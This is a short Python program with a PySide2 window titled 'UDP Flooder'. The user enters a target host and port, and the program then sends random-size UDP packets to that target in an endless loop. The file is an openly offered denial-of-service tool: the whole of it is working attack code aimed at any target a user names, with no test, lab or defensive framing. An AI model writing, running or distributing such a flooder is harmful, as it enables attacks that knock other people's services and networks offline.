import sys
import random
import socket
from PySide2 import QtCore, QtGui, QtWidgets, QtNetwork

class UDPFlooderWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("UDP Flooder")

        self.hostLineEdit = QtWidgets.QLineEdit(self)
        self.hostLineEdit.setPlaceholderText("Enter target host")
        self.portSpinBox = QtWidgets.QSpinBox(self)
        self.portSpinBox.setRange(1, 65535)
        self.portSpinBox.setValue(80)
        self.startButton = QtWidgets.QPushButton("Start Flooding", self)
        self.outputTextEdit = QtWidgets.QTextEdit(self)
        self.outputTextEdit.setReadOnly(True)

        layout = QtWidgets.QVBoxLayout()
        layout.addWidget(self.hostLineEdit)
        layout.addWidget(self.portSpinBox)
        layout.addWidget(self.startButton)
        layout.addWidget(self.outputTextEdit)
        centralWidget = QtWidgets.QWidget(self)
        centralWidget.setLayout(layout)
        self.setCentralWidget(centralWidget)

        self.startButton.clicked.connect(self.startFlooding)

    def startFlooding(self):
        host = self.hostLineEdit.text()
        port = self.portSpinBox.value()

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((host, port))

        self.outputTextEdit.clear()
        self.outputTextEdit.append("Flooding {} on port {}...".format(host, port))
        while True:
            size = int(random.random() * random.random() * random.random() * 1024)
            sock.send(bytes("X" * size, "utf-8"))
            self.outputTextEdit.append("Sent packet of size {}".format(size))
            QtWidgets.QApplication.processEvents()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = UDPFlooderWindow()
    window.show()
    sys.exit(app.exec_())
